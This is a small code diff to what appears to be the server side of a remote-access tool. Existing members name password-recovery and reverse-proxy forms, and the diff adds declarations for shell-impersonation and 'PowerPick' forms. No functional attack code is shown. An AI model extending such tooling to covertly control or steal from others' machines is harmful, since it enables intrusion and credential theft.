@@ -36,6 +36,8 @@ namespace xServer.Core.Networking
         public FrmReverseProxy FrmProxy { get; set; }
         public FrmPasswordRecovery FrmPass { get; set; }
         public FrmConnections FrmCon { get; set; }
+        public FrmShellImpersonate FrmIm { get; set; }
+        public FrmPowerPick FrmPP { get; set; }
 
 
         public bool ReceivedLastDirectory { get; set; }
